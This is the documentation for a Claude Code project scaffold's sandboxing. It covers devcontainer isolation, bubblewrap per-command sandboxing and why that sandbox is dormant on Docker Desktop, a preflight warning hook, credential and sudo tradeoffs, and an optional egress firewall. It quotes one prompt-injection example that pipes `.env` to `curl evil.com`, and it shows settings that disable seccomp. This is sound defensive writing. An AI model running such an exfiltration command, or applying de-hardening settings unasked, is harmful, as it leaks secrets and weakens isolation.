# Sandbox — what it is, when it runs, and why the preflight warns

Generated projects ship `settings.json` with `sandbox.enabled: true`. This
document explains what that sandbox actually is, why it sometimes can't run
(especially on macOS), and how the scaffold stays honest about it instead of
silently pretending it's active.

## Two boundaries, not one

There are two independent isolation layers, and it's worth keeping them
separate in your head:

| Layer             | Isolates                                                        | Provided by                                 |
| ----------------- | --------------------------------------------------------------- | ------------------------------------------- |
| **Devcontainer**  | Claude Code from your **host machine**                          | Docker / the container                      |
| **bwrap sandbox** | each **command's** filesystem + network, _within_ the container | Claude Code's `sandbox` config (bubblewrap) |

The devcontainer is the primary boundary. The bwrap sandbox is _defense in
depth inside it_ — a per-command filesystem/network allowlist so a single rogue
command (e.g. one talked into `cat .env | curl evil.com` via prompt injection)
is constrained even if it runs.

On Linux, that inner sandbox is implemented with **bubblewrap (`bwrap`)**, which
needs **unprivileged user namespaces**. When the kernel or container won't
allow those, `bwrap` can't start — and the sandbox silently does nothing.

## Why this matters on macOS

Docker containers are a **Linux-kernel** feature (namespaces, cgroups,
capabilities, seccomp). macOS has no Linux kernel, so Docker Desktop runs a
hidden **Linux VM** and every container runs _inside_ that VM. The kernel you
see in a Mac devcontainer (`…-linuxkit`) is that VM's kernel, not your Mac.

The real layer cake on a Mac:

```
macOS (your machine)
  └─ hypervisor boundary
      └─ LinuxKit VM            ← Docker Desktop's hidden Linux kernel
          └─ devcontainer       ← where Claude Code runs
              └─ bwrap sandbox   ← wants to start here, usually can't
```

Docker Desktop's VM is deliberately minimal and locked down: unprivileged user
namespaces are restricted, and its seccomp/capability profile blocks the
`capset` call `bwrap` needs — so even making `bwrap` setuid-root is not enough
(it gets past namespace creation, then fails at `capset`). **On Docker Desktop,
the inner sandbox cannot run without weakening the container's security
profile.**

### The silver lining for Mac users

That hidden VM is a _strong_ boundary native-Linux users don't get for free. A
container escape on a Mac only lands an attacker in a disposable Linux VM,
fenced off from macOS by the hypervisor — they'd have to break out of the VM
too to reach your files. So the host-protection job the bwrap sandbox would do
is **already covered by the VM** on macOS. The missing inner layer matters
_less_ here than it would on bare-metal Linux.

## Per-platform matrix

| Environment                    | Inner bwrap sandbox                | Notes                                                                                                                                    |
| ------------------------------ | ---------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| **Docker Desktop (macOS/Win)** | ❌ usually can't run               | Locked-down LinuxKit VM; needs container hardening relaxed. VM is already a strong boundary.                                             |
| **Native Linux**               | ✅ often works                     | May just need `kernel.unprivileged_userns_clone=1`. Container shares the real kernel, so the inner layer is meaningful defense in depth. |
| **Rootless Docker / Podman**   | ✅ frequently works out of the box | User namespaces are the native model.                                                                                                    |
| **Codespaces / some CI**       | ⚠️ varies                          | `runArgs` security options may be ignored or disallowed.                                                                                 |

## How the scaffold stays honest

A guardrail that's _configured on but not enforced_ is worse than an honest
"off" — it reads as protected when it isn't. So every generated project
includes a **SessionStart preflight hook**
(`.claude/hooks/sandbox-preflight.sh`) that:

- checks, at session start, whether `sandbox.enabled` is `true` **and** `bwrap`
  can actually create a namespace;
- prints a clear advisory if it can't (so both you and Claude know the sandbox
  is inert and commands run with only the devcontainer as the boundary);
- stays **silent** when the sandbox is healthy, or when it can't tell (no `jq`,
  no settings file);
- is **advisory only** — it always exits `0` and never blocks the session.

This is why you'll see a sandbox warning at the start of a session on Docker
Desktop. It's expected, and it's telling the truth.

## Trust model & residual risk

Because the inner bwrap sandbox is usually dormant on Docker Desktop (the most
common setup), the **devcontainer is the effective boundary** for most users.
It's worth being honest about what that boundary does and does not protect
against — two deliberate design choices weaken it from the inside:

- **The container bind-mounts your host `~/.claude` credentials (read-write).**
  This is the auth-sharing convenience that means you don't re-login inside the
  container — but it also means anything running in the container can read (and
  overwrite) those credentials.
- **The `node` user has passwordless sudo.** This is a human-developer
  convenience (ad-hoc `apt-get` while iterating). Claude itself can't use it —
  `Bash(sudo:*)` is in the `settings.json` deny-list — but other in-container
  code can.

The realistic threat that combines these is **a malicious or compromised
dependency**: `npm install` (run automatically by `postCreateCommand`) executes
arbitrary `postinstall` scripts as the `node` user, which can then reach root
inside the container and read the mounted host credentials. The container is
**not** a boundary against malicious dependencies.

This is an accepted tradeoff — credential sharing and dev sudo are what make the
high-autonomy workflow ergonomic — but it's mitigated, not ignored:

- The bubblewrap sandbox, **when active** (native Linux with user namespaces),
  constrains each command's filesystem/network and is genuine defense in depth
  here — another reason to light it up on Linux.
- CI runs `actions/dependency-review` on PRs and `npm audit --audit-level=high`,
  and the lockfile is committed — so dependency changes are reviewable.
- The usual supply-chain hygiene applies: pin and vet dependencies, and be
  deliberate about what you add. On a Mac, the LinuxKit VM still backstops the
  host even if a dependency goes rogue inside the container.

If you don't need host-auth sharing, you can drop the `~/.claude` bind mount in
`.devcontainer/devcontainer.json` and authenticate inside the container instead;
if you don't need dev sudo, remove the `sudoers.d/node` line from the
`Dockerfile`. Both tighten the boundary at a small ergonomic cost.

## Recommended posture

- **macOS / Docker Desktop:** treat the **VM + devcontainer as your boundary**
  (genuinely strong) and accept that the bwrap layer is dormant. Do **not**
  weaken the container just to light it up — you'd be degrading a real layer to
  enable a redundant one.
- **Native Linux:** enabling unprivileged user namespaces lights up the inner
  sandbox at no isolation cost — worth doing.

## Opt-in: forcing the inner sandbox on (advanced, with a tradeoff)

If you specifically want the bwrap sandbox active on Docker Desktop, you can
relax the container in `.devcontainer/devcontainer.json`:

```jsonc
{
  "runArgs": ["--security-opt", "seccomp=unconfined"],
  // and, if still blocked, "--cap-add", "SYS_ADMIN"
}
```

**Understand the tradeoff:** `seccomp=unconfined` turns off Docker's syscall
filter _for the whole container_, widening the kernel attack surface — you are
weakening the **outer** boundary to enable the **inner** one. This is only
sensible for experienced users who want nested isolation and understand the
cost; it is **not** a generated default, because it would silently de-harden
every newcomer's project. On macOS the VM still backstops you; on native Linux
this exposes your real kernel, so prefer enabling user namespaces over disabling
seccomp there.

## Opt-in: network-egress firewall (M9 Option A)

Scaffolding with `--network-firewall` (or answering the prompt) adds a **third,
optional boundary**: a default-deny egress allowlist enforced by `iptables`/
`ipset` inside the container, built by `.devcontainer/init-firewall.sh` and run
on every start (`postStartCommand`, via the `NET_ADMIN`/`NET_RAW` caps the
devcontainer requests in `runArgs`).

| Layer               | Isolates                             | Provided by                           |
| ------------------- | ------------------------------------ | ------------------------------------- |
| Devcontainer        | Claude Code from your host           | Docker / the container                |
| bwrap sandbox       | each command's filesystem + network  | Claude Code's `sandbox` (bubblewrap)  |
| **Egress firewall** | the **container's** outbound network | `iptables`/`ipset` allowlist (opt-in) |

Why it's a meaningful addition and not a duplicate of the bwrap sandbox:

- **It works where bwrap can't.** The firewall operates in the container's
  _network_ namespace via `NET_ADMIN`, which needs **no unprivileged user
  namespaces** — so it enforces even on Docker Desktop's LinuxKit VM, the exact
  place the bwrap sandbox is dormant. This is the only layer that restores a
  real network boundary there.
- **It's coarse, not a replacement.** The allowlist is per-container and
  evaluated once at start (CIDR-level); the bwrap sandbox is per-command and
  host-aware. They're complementary — enabling the firewall does not let you
  drop the sandbox config. When it's on, the `SessionStart` preflight appends a
  note so its "bwrap dormant" message doesn't read as "no network boundary."
- **It pairs with isolated credentials.** Against a malicious dependency
  postinstall, isolated credentials (Option B) stop it reading host `~/.claude`
  and the firewall stops it exfiltrating to an off-allowlist host.

**The cost is allowlist maintenance.** The default allows DNS/localhost, the
host/LAN, GitHub's published ranges (covers `github.com`, the API/CDN, and the
plugin marketplace), the npm registry, and the Anthropic endpoints Claude Code
needs. If your project pulls from other registries or CDNs, widen
`ALLOWED_DOMAINS` in `init-firewall.sh` — too tight and `npm install` /
plugin-resolution break. The script **fails closed**: a misbuilt allowlist makes
its verification step exit non-zero at container start rather than letting an
inert firewall look active. This is why it's opt-in, not a default. See
`docs/specs/network-isolation.md`.
